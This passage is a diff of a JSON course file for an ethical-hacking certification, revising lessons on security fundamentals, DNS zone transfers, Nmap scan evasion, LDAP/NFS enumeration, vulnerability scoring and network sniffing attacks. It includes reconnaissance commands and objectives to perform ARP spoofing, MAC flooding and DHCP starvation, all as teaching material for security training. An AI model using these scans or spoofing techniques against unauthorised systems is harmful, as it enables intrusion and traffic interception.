@@ -46,6 +46,7 @@
       "name": "Network and Perimeter Hacking",
       "modules": [
         8,
+        9,
         10,
         11,
         12
@@ -107,7 +108,7 @@
       "topics": [
         {
           "title": "Information Security Fundamentals",
-          "content": "<p>Information security revolves around protecting the <strong>Confidentiality, Integrity, and Availability (CIA)</strong> of data.</p><ul><li><strong>Confidentiality</strong> ensures that data is accessible only to authorized parties.</li><li><strong>Integrity</strong> ensures that data remains accurate and unmodified by unauthorized users.</li><li><strong>Availability</strong> ensures that information and resources are accessible to authorized users whenever they are needed. This involves maintaining hardware, performing repairs, and keeping systems running to prevent disruptions. Denial-of-service attacks are a direct threat to availability.</li></ul><p>Additional security concepts include <strong>Authentication, Authorization, and Non-repudiation (AAA)</strong>, which form the basis of access control systems. <strong>Defense in depth</strong> is a security strategy that employs multiple layers of security controls placed throughout an information technology system, so if one layer fails, the next layer will stop the threat.</p>",
+          "content": "<p>Information security revolves around protecting the <strong>Confidentiality, Integrity, and Availability (CIA)</strong> of data.</p><ul><li><strong>Confidentiality</strong> ensures that data is accessible only to authorized parties.</li><li><strong>Integrity</strong> ensures that data remains accurate and unmodified by unauthorized users.</li><li><strong>Availability</strong> ensures that information and resources are accessible to authorized users whenever they are needed. This involves maintaining hardware, performing repairs, and keeping systems running to prevent disruptions. <strong>Denial-of-service (DoS)</strong> attacks are a direct threat to availability, exhausting a system's resources.</li></ul><p>Additional security concepts include <strong>Authentication, Authorization, and Non-repudiation (AAA)</strong>. <strong>Non-repudiation</strong> guarantees that the sender cannot deny having sent a message. <strong>Defense in depth</strong> is a security strategy that employs multiple layers of security controls placed throughout an information technology system, so if one layer fails, the next layer will stop the threat.</p>",
           "keyTerms": [
             "CIA Triad",
             "Confidentiality",
@@ -115,60 +116,61 @@
             "Availability",
             "Non-repudiation",
             "AAA",
-            "Defense in Depth"
+            "Defense in Depth",
+            "DoS"
           ]
         },
         {
           "title": "Ethical Hacking Concepts",
-          "content": "<p>Ethical hacking involves authorized attempts to gain unauthorized access to systems to identify vulnerabilities. Hackers are typically categorized by their intent:</p><ul><li><strong>Black Hat:</strong> Hackers who violate computer security for personal gain, malicious intent, or other harmful purposes without authorization.</li><li><strong>White Hat:</strong> Ethical hackers who use their skills defensively and with permission.</li><li><strong>Gray Hat:</strong> Hackers who may violate laws but without malicious intent.</li><li><strong>Script Kiddies:</strong> Unskilled individuals who use tools created by others.</li></ul><p>Security testing methods differ by the knowledge provided to the tester:</p><ul><li><strong>Black Box Testing:</strong> Also known as zero-knowledge testing, performed when the tester has no prior knowledge of the target infrastructure, simulating a real-world external attacker.</li><li><strong>White Box Testing:</strong> Provides full knowledge of the target environment.</li><li><strong>Gray Box Testing:</strong> Provides partial knowledge of the target environment.</li></ul>",
+          "content": "<p>Ethical hacking involves authorized attempts to gain unauthorized access to systems to identify vulnerabilities (e.g., input validation flaws or buffer overflows). Hackers are categorized by their intent and permissions:</p><ul><li><strong>Black Hat:</strong> Hackers who violate computer security for personal gain, malicious intent, or other harmful purposes without authorization.</li><li><strong>White Hat:</strong> Ethical hackers who have permission and positive intent to use their skills defensively.</li><li><strong>Gray Hat:</strong> Hackers who may violate laws but without malicious intent, hacking without permission but often notifying the target.</li><li><strong>Script Kiddies:</strong> Unskilled individuals who use tools created by others.</li><li><strong>Hacktivists:</strong> Hackers who break into systems to promote political or social change.</li><li><strong>State-Sponsored Actors (APTs):</strong> Highly skilled and well-funded attackers backed by a government.</li><li><strong>Insider Threats:</strong> Come from within the organization, such as a disgruntled employee.</li></ul><p>Security testing methods differ by the knowledge provided to the tester:</p><ul><li><strong>Black Box Testing:</strong> Also known as zero-knowledge testing, performed when the tester has no prior knowledge of the target infrastructure, simulating a real-world external attacker.</li><li><strong>White Box Testing:</strong> Provides full knowledge of the target environment.</li><li><strong>Gray Box Testing:</strong> Provides partial knowledge of the target environment.</li></ul>",
           "keyTerms": [
             "White Hat",
             "Black Hat",
             "Gray Hat",
             "Script Kiddie",
+            "Hacktivist",
+            "APT",
+            "Insider Threat",
             "Black Box",
             "White Box",
             "Gray Box",
-            "Penetration Testing"
+            "Input Validation Flaw"
           ]
         },
         {
           "title": "Hacking Methodology and Frameworks",
-          "content": "<p>The CEH methodology defines five phases of hacking:</p><ul><li><strong>Reconnaissance (Footprinting):</strong> The first phase where the attacker gathers information without direct interaction (passive) or with interaction (active). Passive reconnaissance involves searching public records, social media, and WHOIS data.</li><li><strong>Scanning:</strong> Probing the target for open ports, services, and vulnerabilities.</li><li><strong>Gaining Access (Exploitation):</strong> Exploiting vulnerabilities to enter the system.</li><li><strong>Maintaining Access:</strong> Establishing persistent access. In the <strong>Cyber Kill Chain</strong>, this corresponds to the <em>Installation</em> phase, where the attacker installs persistent backdoors or rootkits on the compromised system to maintain access, prior to Command and Control (C2).</li><li><strong>Clearing Tracks:</strong> Removing evidence of the intrusion.</li></ul><p>Frameworks like the <strong>NIST Cybersecurity Framework</strong> provide structure for defensive operations, consisting of five core functions: <strong>Identify, Protect, Detect, Respond, and Recover</strong>. The <strong>Detect</strong> function specifically focuses on developing and implementing appropriate activities to identify the occurrence of a cybersecurity event in a timely manner, including continuous monitoring and anomaly detection.</p>",
+          "content": "<p>The ethical hacking methodology defines five core phases:</p><ul><li><strong>Reconnaissance (Footprinting):</strong> The first phase where the attacker gathers information without direct interaction (passive) or with interaction (active). Passive reconnaissance involves searching public records, social media, and WHOIS data.</li><li><strong>Scanning:</strong> Probing the target for open ports, services, and vulnerabilities.</li><li><strong>Gaining Access (Exploitation):</strong> Exploiting vulnerabilities to enter the system.</li><li><strong>Maintaining Access:</strong> Establishing persistent access by installing backdoors. In the <strong>Cyber Kill Chain</strong>, this corresponds to the <em>Installation</em> phase (installing backdoors or rootkits), prior to Command and Control (C2).</li><li><strong>Covering Tracks:</strong> Removing evidence of the intrusion.</li></ul><p>Frameworks like the <strong>NIST Cybersecurity Framework</strong> provide structure for defensive operations, consisting of five core functions: <strong>Identify, Protect, Detect, Respond, and Recover</strong>. The <strong>Detect</strong> function specifically focuses on continuous monitoring to identify the occurrence of a cybersecurity event.</p>",
           "keyTerms": [
             "Reconnaissance",
             "Scanning",
             "Gaining Access",
             "Maintaining Access",
-            "Clearing Tracks",
+            "Covering Tracks",
             "Cyber Kill Chain",
             "NIST Detect"
           ]
         },
         {
           "title": "Security Controls",
-          "content": "<p>Security controls are safeguards designed to protect information systems. They are classified into three categories:</p><ul><li><strong>Technical Controls (Logical Controls):</strong> Use technology to protect information systems. Examples include firewalls, IDS/IPS, encryption, and access control lists.</li><li><strong>Administrative Controls:</strong> Involve policies, procedures, training, and risk assessments.</li><li><strong>Physical Controls:</strong> Tangible safeguards like fences, locks, guards, and security cameras.</li></ul><p>Controls can also be categorized by function: Preventive, Detective, Corrective, Deterrent, Compensating, and Recovery controls.</p>",
+          "content": "<p>Security controls are safeguards designed to protect information systems. They are classified into three categories:</p><ul><li><strong>Technical Controls (Logical Controls):</strong> Use technology to protect information systems. Examples include firewalls, IDS/IPS, encryption, and access control lists.</li><li><strong>Administrative Controls:</strong> Involve policies, procedures, training, and risk assessments.</li><li><strong>Physical Controls:</strong> Tangible safeguards like fences, locks, guards, and security cameras.</li></ul><p>These controls are implemented as part of a <strong>Defense in Depth</strong> strategy to provide layered security.</p>",
           "keyTerms": [
             "Physical Controls",
             "Technical Controls",
             "Administrative Controls",
-            "Preventive",
-            "Detective",
-            "Corrective",
-            "Compensating Controls"
+            "Defense in Depth"
           ]
         },
         {
           "title": "Information Security Laws and Standards",
-          "content": "<p>Ethical hackers must operate within legal frameworks and understand regulations. A key component of legal testing is the <strong>Rules of Engagement (ROE)</strong> document (or Penetration Testing Agreement), which defines the scope, boundaries, methods, timelines, and legal protections for a penetration test.</p><p>Key laws and standards include:</p><ul><li><strong>Computer Fraud and Abuse Act (CFAA):</strong> The primary U.S. federal law that criminalizes unauthorized access to computer systems, fraud, and damage to computing infrastructure.</li><li><strong>GDPR:</strong> European regulation for data protection.</li><li><strong>HIPAA:</strong> U.S. law protecting healthcare data.</li><li><strong>SOX:</strong> U.S. law covering financial reporting.</li><li><strong>PCI DSS:</strong> Standard for payment card data security.</li></ul>",
+          "content": "<p>Ethical hackers must operate within legal frameworks and understand regulations. A key component of legal testing is the <strong>Rules of Engagement (ROE)</strong> document (or Penetration Testing Agreement), which defines the scope, boundaries, methods, timelines, and legal protections for a penetration test.</p><p>Key laws and standards include:</p><ul><li><strong>Computer Fraud and Abuse Act (CFAA):</strong> The primary U.S. federal law that criminalizes unauthorized access to computer systems, fraud, and damage to computing infrastructure.</li><li><strong>GDPR:</strong> European regulation for data protection.</li><li><strong>HIPAA:</strong> U.S. law protecting healthcare data and patient privacy.</li><li><strong>SOX:</strong> U.S. law covering corporate financial reporting.</li><li><strong>FISMA:</strong> U.S. law governing federal information systems.</li><li><strong>PCI DSS:</strong> Standard for payment card data security.</li></ul>",
           "keyTerms": [
             "CFAA",
-            "Rules of Engagement",
             "ROE",
             "GDPR",
             "HIPAA",
             "PCI DSS",
-            "SOX"
+            "SOX",
+            "FISMA"
           ]
         }
       ],
@@ -211,7 +213,7 @@
         },
         {
           "title": "DNS Footprinting",
-          "content": "<p>DNS footprinting involves querying DNS servers to map out infrastructure.</p><ul><li><strong>nslookup:</strong> A command-line tool used to query DNS servers for various record types including A, MX (mail exchange), NS (name server), CNAME, and SOA records.</li><li><strong>Zone Transfers:</strong> If misconfigured, a DNS server may allow a full zone transfer (AXFR), exposing the complete list of DNS records. This can be accomplished using commands like: <code>dig axfr target.com @dns-server</code>, <code>nslookup -type=AXFR target.com dns-server</code>, or <code>host -l target.com dns-server</code>.</li><li><strong>Subdomain Enumeration:</strong> Subdomains expand the attack surface. Techniques like DNS enumeration and subdomain brute-forcing (using tools like Sublist3r, Amass, and dnsrecon) or checking certificate transparency logs can reveal hidden services and development servers.</li></ul>",
+          "content": "<p>DNS footprinting involves querying DNS servers to map out infrastructure.</p><ul><li><strong>nslookup:</strong> A command-line tool used to query DNS servers for various record types including A, MX (mail exchange), NS (name server), CNAME, and SOA records.</li><li><strong>Zone Transfers (AXFR):</strong> If misconfigured, a DNS server may allow a full zone transfer, exposing the complete list of DNS records to any requesting host. This can be accomplished using commands like: <code>dig axfr target.com @dns-server</code>, <code>nslookup -type=AXFR target.com dns-server</code>, or <code>host -l target.com dns-server</code>.</li><li><strong>Subdomain Enumeration:</strong> Techniques like DNS enumeration and subdomain brute-forcing (using tools like Sublist3r, Amass, and dnsrecon) or checking certificate transparency logs can reveal hidden services and expanded attack surfaces.</li></ul>",
           "keyTerms": [
             "nslookup",
             "AXFR",
@@ -286,7 +288,7 @@
       "topics": [
         {
           "title": "Network Scanning Methodology & Port Responses",
-          "content": "<p>Network scanning identifies live systems, open ports, and services. Understanding TCP/IP communication is crucial.</p><ul><li><strong>Common Ports:</strong> Port <strong>443</strong> is the well-known port for <strong>HTTPS</strong> (HTTP over TLS/SSL). Port 80 is HTTP, 8080 is an alternative HTTP, and 22 is SSH.</li><li><strong>Port States and Responses:</strong> When an open port receives a TCP SYN packet, it responds with <strong>SYN-ACK</strong>. When a <strong>closed port</strong> receives a TCP SYN packet, it responds with a <strong>RST-ACK</strong> (Reset-Acknowledge) packet.</li><li><strong>Firewall Filtering:</strong> If a host responds to a probe with an <strong>ICMP Type 3, Code 13 (Communication Administratively Prohibited)</strong>, it indicates that a firewall or packet filtering device is actively blocking the traffic and rejecting specific packets, rather than silently dropping them.</li></ul>",
+          "content": "<p>Network scanning identifies live systems, open ports, and services. Understanding TCP/IP communication is crucial.</p><ul><li><strong>Common Ports:</strong> Port <strong>443</strong> is the well-known port for <strong>HTTPS</strong> (HTTP over TLS/SSL). Port 80 is HTTP, 8080 is an alternative HTTP, and 22 is SSH.</li><li><strong>Port States and Responses:</strong> When an open port receives a TCP SYN packet, it responds with <strong>SYN-ACK</strong>. When a <strong>closed port</strong> receives a TCP SYN packet, it responds with a <strong>RST-ACK</strong> (Reset-Acknowledge) packet.</li><li><strong>Firewall Filtering:</strong> If a host responds to a SYN packet with no response on most ports but returns <strong>ICMP Type 3, Code 13 (Communication Administratively Prohibited)</strong> on some ports, it indicates that a firewall or packet filtering device is actively blocking the traffic and explicitly rejecting it.</li></ul>",
           "keyTerms": [
             "SYN-ACK",
             "RST-ACK",
@@ -298,7 +300,7 @@
         },
         {
           "title": "Nmap Scan Types and Techniques",
-          "content": "<p>Nmap provides numerous scan techniques tailored for different scenarios:</p><ul><li><strong>SYN Stealth Scan (<code>-sS</code>):</strong> Performs a half-open scan by sending SYN packets and analyzing the response without completing the three-way handshake, making it less likely to be logged.</li><li><strong>XMAS Scan (<code>-sX</code>):</strong> Sends TCP packets with the <strong>FIN, PSH, and URG</strong> flags set (lit up like a Christmas tree). It can bypass some stateless firewalls. Closed ports should respond with RST, while open/filtered ports do not respond.</li><li><strong>Idle Scan (<code>-sI</code>):</strong> Uses a zombie host as a proxy to scan the target. The attacker sends spoofed packets using the zombie's IP and monitors changes in the zombie's IP ID sequence. This is the <strong>stealthiest Nmap scan</strong> because no packets are sent directly from the attacker to the target.</li><li><strong>Timing Templates:</strong> The <strong><code>-T5</code> (Insane)</strong> timing template is the fastest scan speed but generates a high volume of rapid traffic, making it the <strong>most likely to be detected by IDS/IPS</strong>.</li></ul>",
+          "content": "<p>Nmap provides numerous scan techniques tailored for different scenarios:</p><ul><li><strong>SYN Stealth Scan (<code>-sS</code>):</strong> Performs a half-open scan by sending SYN packets and analyzing the response without completing the three-way handshake, making it less likely to be logged.</li><li><strong>XMAS Scan (<code>-sX</code>):</strong> Sends TCP packets with the <strong>FIN, PSH, and URG</strong> flags set (lit up like a Christmas tree). It can bypass some stateless firewalls. Closed ports should respond with RST, while open/filtered ports do not respond.</li><li><strong>Idle Scan (<code>-sI</code>):</strong> Uses a zombie host as a proxy to scan the target without sending packets directly to the target. The attacker sends spoofed packets using the zombie's IP and monitors changes in the zombie's IP ID sequence. This is the <strong>stealthiest Nmap scan</strong>.</li><li><strong>Timing Templates:</strong> The <strong><code>-T5</code> (Insane)</strong> timing template provides the fastest scan speed but generates a high volume of rapid traffic, making it the <strong>most likely to be detected by IDS/IPS</strong>. <code>-T0</code> (Paranoid) and <code>-T1</code> (Sneaky) are designed for evasion.</li></ul>",
           "keyTerms": [
             "Nmap -sS",
             "SYN Scan",
@@ -362,7 +364,7 @@
       "topics": [
         {
           "title": "Enumeration Concepts",
-          "content": "<p><strong>Enumeration</strong> is the process of actively connecting to a target system to <strong>extract detailed information</strong> such as usernames, group names, network shares, services, DNS details, and application banners. Unlike passive reconnaissance, enumeration involves direct and active interaction with the target.</p><p>Different protocols reveal different types of data when enumerated.</p>",
+          "content": "<p><strong>Enumeration</strong> is the primary purpose of actively connecting to a target system to <strong>extract detailed information</strong> such as usernames, group names, network shares, services, DNS details, and application banners. Unlike passive reconnaissance, enumeration involves direct and active interaction with the target, typically requiring some level of access or exploiting misconfigured services.</p>",
           "keyTerms": [
             "Enumeration",
             "Active Interaction",
@@ -397,94 +399,101 @@
         },
         {
           "title": "LDAP and DNS Enumeration",
-          "content": "<p><strong>LDAP Enumeration:</strong> The <strong><code>ldapsearch</code></strong> command-line utility is commonly used to query LDAP (ports 389/636) to extract detailed information about users, groups, and organizational units (OUs) from Active Directory.</p><p><strong>DNS Enumeration:</strong> DNS enumeration maps infrastructure. When enumerating DNS, an attacker may discover an <strong>AAAA record</strong>, which specifically maps a hostname to a <strong>128-bit IPv6 address</strong> (as opposed to an A record for IPv4).</p>",
+          "content": "<p><strong>LDAP Enumeration:</strong> The <strong>ldapsearch</strong> command-line utility is used to query LDAP directories (ports 389/636). In Active Directory environments, it can extract detailed information about users, groups, organizational units, and computer accounts.</p><p><strong>DNS Enumeration:</strong> After performing a successful zone transfer, attackers obtain a complete list of all DNS records. The <strong>AAAA</strong> record maps a hostname to a 128-bit IPv6 address, whereas an A record maps to an IPv4 address. Exposing AAAA records can reveal IPv6 infrastructure.</p>",
           "keyTerms": [
-            "ldapsearch",
             "LDAP",
-            "Active Directory",
-            "AAAA Record",
-            "IPv6",
-            "DNS Enumeration"
+            "ldapsearch",
+            "DNS",
+            "AAAA",
+            "IPv6"
           ]
         },
         {
-          "title": "RPC and NFS Enumeration",
-          "content": "<p>Network File System (NFS) misconfigurations often lead to data exposure.</p><p>Using the command <strong><code>showmount -e target</code></strong> allows an attacker to list available NFS exports on a remote server. The primary security concern arises when an export list contains a wildcard (<code>*</code>), meaning the NFS share <strong>allows mounting by any host</strong>, leading to unauthorized access to sensitive files and directories.</p>",
+          "title": "NFS Enumeration",
+          "content": "<p>The Network File System (NFS) allows sharing directories over a network. During an engagement, discovering an NFS export that allows mounting by any host (<code>*</code> in the exports list) is a major finding.</p><p>To list available NFS shares on the target, an attacker would use the command <strong><code>showmount -e target</code></strong>. The primary security concern is unauthorized access to sensitive files, configuration data, and potentially SSH keys.</p>",
           "keyTerms": [
-            "showmount",
-            "NFS Exports",
-            "Wildcard Mount",
+            "NFS",
+            "showmount -e",
+            "Exports",
             "Unauthorized Access"
           ]
         }
       ],
       "tools": [
         "enum4linux",
-        "BloodHound",
-        "ldapsearch",
         "snmpwalk",
-        "onesixtyone",
-        "nbtscan",
-        "rpcclient"
+        "ldapsearch",
+        "nbtstat",
+        "SuperScan",
+        "Hyena",
+        "NetBScanner"
       ],
       "v13Updates": [
-        "Cloud directory enumeration (Azure AD, AWS IAM)",
-        "AI-assisted enumeration patterns"
+        "Cloud-native directory enumeration",
+        "Zero Trust impact on legacy enumeration techniques"
       ]
     },
     {
       "id": 5,
       "title": "Vulnerability Analysis",
       "domainId": 3,
-      "icon": "bug",
-      "description": "Explains vulnerability assessment concepts, scoring systems like CVSS, vulnerability scanning tools, and the vulnerability management lifecycle from discovery to remediation.",
+      "icon": "search",
+      "description": "Explores the vulnerability management lifecycle, scoring systems (CVSS), and the use of automated scanning tools to identify and prioritize system weaknesses.",
       "objectives": [
-        "Understand vulnerability assessment concepts and types",
-        "Explain CVSS scoring and vulnerability classification",
-        "Use vulnerability scanning tools like Nessus and OpenVAS",
-        "Differentiate between vulnerability assessments and penetration tests",
-        "Describe the vulnerability management lifecycle"
+        "Understand the vulnerability management lifecycle",
+        "Differentiate between vulnerability assessment and penetration testing",
+        "Interpret CVSS v3.1 scores and metrics",
+        "Perform vulnerability scanning using tools like Nessus",
+        "Analyze scan results and prioritize remediation"
       ],
       "topics": [
         {
-          "title": "Vulnerability Assessment Concepts",
-          "content": "<p>A <strong>vulnerability assessment</strong> identifies, quantifies, and reports vulnerabilities in a system. The key difference between a vulnerability assessment and a <strong>penetration test</strong> is that a penetration test goes a step further and <strong>actively exploits vulnerabilities</strong> to demonstrate real-world impact.</p><p>During scanning, a tool may incorrectly report a vulnerability that does not actually exist on the target system. This type of result is known as a <strong>False Positive</strong>.</p>",
+          "title": "Vulnerability Management and Concepts",
+          "content": "<p>A <strong>vulnerability assessment</strong> identifies, quantifies, and prioritizes vulnerabilities in a system but stops short of exploitation. In contrast, a <strong>penetration test</strong> actively exploits discovered vulnerabilities to demonstrate real-world impact. A <strong>zero-day vulnerability</strong> is a flaw that is actively exploited before the vendor has released a patch.</p><p>The <strong>vulnerability management lifecycle</strong> includes Discovery, Assessment, Remediation, and Verification. <strong>Remediation</strong> involves deploying patches to fix vulnerabilities. Organizations may also choose <strong>Risk Acceptance</strong>, deciding not to fix a vulnerability because the cost outweighs the risk. <strong>Continuous vulnerability management</strong> involves ongoing, automated scanning and monitoring of systems to detect new vulnerabilities, offering real-time visibility rather than periodic assessments.</p>",
           "keyTerms": [
             "Vulnerability Assessment",
-            "Penetration Test",
-            "False Positive"
+            "Penetration Testing",
+            "Zero-day",
+            "Remediation",
+            "Risk Acceptance",
+            "Continuous Vulnerability Management"
           ]
         },
         {
-          "title": "CVSS (Common Vulnerability Scoring System)",
-          "content": "<p><strong>CVSS</strong> stands for the <strong>Common Vulnerability Scoring System</strong>. Its purpose is to rate the severity of vulnerabilities on a scale from 0.0 to 10.0.</p><ul><li><strong>Severity Classification (v3.1):</strong> A CVSS base score of <strong>9.8</strong> is classified as <strong>Critical</strong> (Critical range is 9.0 - 10.0).</li><li><strong>Temporal Metrics:</strong> The CVSS metric group that measures characteristics of a vulnerability that <strong>change over time</strong> (such as the availability of exploit code or patches) is the <strong>Temporal Metrics</strong> group.</li></ul>",
+          "title": "CVSS and Vulnerability Databases",
+          "content": "<p><strong>CVSS (Common Vulnerability Scoring System)</strong> is an open framework used to rate the severity of software vulnerabilities. In CVSS v3.1, a base score of <strong>9.8</strong> is classified as <strong>Critical</strong> (Critical range is 9.0 - 10.0). The <strong>Temporal Metrics</strong> group measures characteristics of a vulnerability that change over time, such as the availability of exploit code (Exploit Code Maturity) or patches (Remediation Level).</p><p>Key databases and standards include:</p><ul><li><strong>CVE (Common Vulnerabilities and Exposures):</strong> A list of publicly disclosed vulnerabilities.</li><li><strong>NVD (National Vulnerability Database):</strong> A U.S. government repository of standards-based vulnerability data that synchronizes with the CVE list and provides CVSS scores.</li><li><strong>CWE (Common Weakness Enumeration):</strong> A database maintained by MITRE listing common software and hardware weakness types.</li><li><strong>OVAL (Open Vulnerability and Assessment Language):</strong> A standard language often used to structure and share vulnerability assessment data.</li></ul>",
           "keyTerms": [
             "CVSS",
             "Critical Severity",
-            "9.8",
-            "Temporal Metrics"
+            "Temporal Metrics",
+            "CVE",
+            "NVD",
+            "CWE",
+            "OVAL"
           ]
         },
         {
-          "title": "Vulnerability Scanning Tools and Techniques",
-          "content": "<p>Automated tools scan for known weaknesses:</p><ul><li><strong>Nessus:</strong> A widely-used <strong>commercial</strong> vulnerability scanner that identifies vulnerabilities, misconfigurations, and compliance issues.</li><li><strong>OpenVAS (Greenbone):</strong> An <strong>open-source</strong> vulnerability scanner that serves as a popular alternative to commercial solutions like Nessus.</li></ul><p>Scans can be credentialed or non-credentialed. <strong>Credentialed scans</strong> authenticate to the system and provide significantly more accurate results because they can <strong>detect missing patches, local misconfigurations, and installed software</strong> that non-credentialed external scans would miss.</p>",
+          "title": "Scanning Techniques and Tools",
+          "content": "<p>Vulnerability scanning can be performed using various techniques:</p><ul><li><strong>Active Scanning:</strong> Sends packets to the target and analyzes the responses.</li><li><strong>Passive Scanning:</strong> Observes network traffic to identify active systems, open ports, and vulnerabilities without sending active probes.</li><li><strong>Credentialed vs Non-credentialed:</strong> <strong>Credentialed scans</strong> log into the target system and can inspect local configurations, detect missing patches, and verify installed software. This is significantly more accurate and thorough than non-credentialed scans.</li><li><strong>Static Analysis (SAST):</strong> Involves analyzing the application's source code without executing it.</li></ul><p>Common tools include <strong>Tenable Nessus</strong> (a widely-used commercial vulnerability scanner), <strong>OpenVAS (Greenbone)</strong> (an open-source alternative), and <strong>Nikto</strong> (an open-source scanner primarily used for web applications).</p>",
           "keyTerms": [
+            "Active Scanning",
+            "Passive Scanning",
+            "Credentialed Scan",
+            "SAST",
             "Nessus",
-            "Commercial Scanner",
             "OpenVAS",
-            "Greenbone",
-            "Open-source Scanner",
-            "Credentialed Scan"
+            "Nikto"
           ]
         },
         {
-          "title": "Vulnerability Management and Remediation",
-          "content": "<p>Organizations must manage vulnerabilities continually. <strong>Continuous vulnerability management</strong> is the strategy of continuously monitoring the network for new vulnerabilities (ongoing, automated scanning) rather than relying solely on periodic, one-time assessments.</p><p>When a scan reveals a critical legacy issue, such as <strong>CVE-2014-0160 (Heartbleed) in OpenSSL</strong>, the most appropriate next step for an analyst is to <strong>verify the finding manually, prioritize patching to the latest secure OpenSSL version, and revoke/reissue affected SSL certificates</strong> since private keys may have been compromised.</p>",
+          "title": "Analyzing Scan Results",
+          "content": "<p>Analyzing scan results requires validating the findings. A <strong>false positive</strong> occurs when a scanner incorrectly reports a vulnerability that does not actually exist. Conversely, a <strong>false negative</strong> is a dangerous scenario where a real vulnerability exists but is not detected.</p><p>Proper remediation depends on the severity. For example, if a scan identifies a critical vulnerability like <strong>Heartbleed (CVE-2014-0160)</strong> in OpenSSL, the appropriate next step is to verify the finding manually, prioritize patching to the latest secure version, and subsequently <strong>revoke and reissue affected SSL certificates</strong>, as private keys may have been compromised.</p>",
           "keyTerms": [
-            "Continuous Vulnerability Management",
+            "False Positive",
+            "False Negative",
             "Heartbleed",
-            "CVE-2014-0160",
-            "Remediation"
+            "Remediation",
+            "Validation"
           ]
         }
       ],
@@ -494,12 +503,11 @@
         "Qualys",
         "Nexpose",
         "Nikto",
-        "OWASP ZAP",
-        "Burp Suite"
+        "GFI LanGuard"
       ],
       "v13Updates": [
-        "AI-driven vulnerability prioritization",
-        "Automated exploit prediction models"
+        "AI-driven risk scoring models",
+        "Automated patch prioritization"
       ]
     },
     {
@@ -676,81 +684,80 @@
       "title": "Sniffing",
       "domainId": 4,
       "icon": "wifi",
-      "description": "Covers packet sniffing concepts, network traffic analysis, and common Layer 2 attacks including ARP spoofing, MAC flooding, and DNS poisoning techniques.",
+      "description": "Covers packet sniffing concepts, network traffic analysis, and attacks on network infrastructure including MAC flooding, ARP spoofing, DHCP starvation, and DNS spoofing.",
       "objectives": [
-        "Differentiate between active and passive sniffing",
-        "Understand switched network sniffing techniques",
-        "Perform ARP spoofing and MAC flooding attacks",
-        "Analyze network traffic using Wireshark",
-        "Implement sniffing countermeasures"
+        "Understand active and passive sniffing concepts",
+        "Perform network traffic analysis using Wireshark and tcpdump",
+        "Execute MAC flooding and CAM table exhaustion attacks",
+        "Perform ARP spoofing, DHCP starvation, and DNS poisoning",
+        "Implement network sniffing countermeasures"
       ],
       "topics": [
         {
           "title": "Packet Sniffing Concepts",
-          "content": "<p>Packet sniffing involves capturing and inspecting network traffic as it travels across a network.</p><ul><li><strong>Hubs vs. Switches:</strong> On older hub-based networks, all traffic is broadcast to every port, making <em>passive sniffing</em> trivial. Modern networks use switches, which forward traffic only to the specific destination port based on MAC address tables. To sniff on a switched network, an attacker must use <em>active sniffing</em> techniques.</li><li><strong>Wireshark:</strong> The industry standard for network protocol analysis. It captures packets in real-time. Analysts use display filters to isolate specific traffic. For example, using the filter <code>http.request.method == \"GET\"</code> explicitly isolates HTTP GET requests for analysis.</li><li><strong>HTTPS Encryption:</strong> When performing a Man-in-the-Middle (MITM) attack, tools like Ettercap can intercept traffic. However, if the traffic is HTTPS (encrypted via TLS/SSL), the packet contents remain unreadable to the attacker unless advanced techniques like SSL stripping or certificate spoofing are successfully deployed.</li></ul>",
+          "content": "<p>Sniffing involves capturing and analyzing network traffic as it flows across a network. It can be categorized into two main types:</p><ul><li><strong>Passive Sniffing:</strong> Used in networks utilizing hubs (which broadcast traffic to all ports). The attacker simply places their Network Interface Card (NIC) in <strong>promiscuous mode</strong> to capture all traffic on the collision domain without sending any additional packets.</li><li><strong>Active Sniffing:</strong> Required in switched networks (which only send traffic to the specific destination port). To capture traffic intended for others, the attacker must actively inject packets into the network to manipulate the switch's behavior (e.g., via ARP spoofing or MAC flooding).</li><li><strong>SPAN/Mirror Ports:</strong> In enterprise environments, security tools (like an IDS) are connected to a Switch Port Analyzer (SPAN) or mirror port to passively monitor a copy of all network traffic.</li></ul>",
           "keyTerms": [
-            "Packet Sniffing",
-            "Passive Sniffing",
             "Active Sniffing",
-            "Hub",
-            "Switch",
-            "Wireshark",
-            "HTTPS",
-            "SSL Stripping"
+            "Passive Sniffing",
+            "Promiscuous Mode",
+            "SPAN Port",
+            "Mirror Port"
           ]
         },
         {
-          "title": "ARP Spoofing and Poisoning",
-          "content": "<p>ARP (Address Resolution Protocol) resolves IP addresses to MAC addresses on a local network. Because ARP is stateless and lacks authentication, it is highly vulnerable.</p><ul><li><strong>The Attack:</strong> ARP spoofing involves an attacker sending forged ARP replies onto the network. The goal is to maliciously associate the attacker's MAC address with the IP address of a legitimate host, most commonly the default gateway.</li><li><strong>Impact:</strong> This redirects traffic intended for the gateway through the attacker's machine, establishing a Man-in-the-Middle (MITM) position for sniffing or manipulation.</li><li><strong>Detection:</strong> A strong indicator that an ARP spoofing attack is actively occurring is when a network analyst observes multiple IP addresses resolving to the exact same MAC address in their ARP cache.</li></ul>",
+          "title": "Network Traffic Analysis Tools",
+          "content": "<p>Effective traffic analysis requires specialized tools to capture and dissect packets.</p><ul><li><strong>Wireshark:</strong> The industry-standard graphical network protocol analyzer. It allows users to capture traffic in real-time or read from PCAP (Packet Capture) files. Wireshark utilizes powerful <strong>display filters</strong> (e.g., <code>tcp.port == 80</code>) to isolate specific traffic of interest.</li><li><strong>tcpdump:</strong> A robust command-line packet analyzer used widely in Unix/Linux environments. It uses <strong>capture filters</strong> (BPF syntax) to restrict which packets are saved to disk or displayed, minimizing resource usage during high-volume captures.</li></ul>",
           "keyTerms": [
-            "ARP Spoofing",
-            "ARP Poisoning",
-            "MITM",
-            "Forged ARP Replies",
-            "MAC Address"
+            "Wireshark",
+            "tcpdump",
+            "PCAP",
+            "Display Filters",
+            "Capture Filters"
           ]
         },
         {
-          "title": "MAC Flooding and DHCP Attacks",
-          "content": "<p>Attackers manipulate fundamental Layer 2 protocols to compromise network integrity.</p><ul><li><strong>MAC Flooding:</strong> A switch relies on its Content Addressable Memory (CAM) table to map MAC addresses to physical ports. A MAC flooding attack sends thousands of Ethernet frames with randomized, spoofed source MAC addresses. When the CAM table overflows, the switch can no longer learn new mappings, forcing it into a 'fail-open' mode where it behaves like a hub—broadcasting all traffic to all ports, thereby enabling the attacker to sniff the network.</li><li><strong>DHCP Spoofing:</strong> In this attack, an adversary introduces a rogue DHCP server into the network. This rogue server races to respond to client DHCP requests, distributing malicious configuration parameters such as a fake default gateway or a malicious DNS server address to hijack client traffic.</li></ul>",
+          "title": "MAC Attacks and Switch Exploitation",
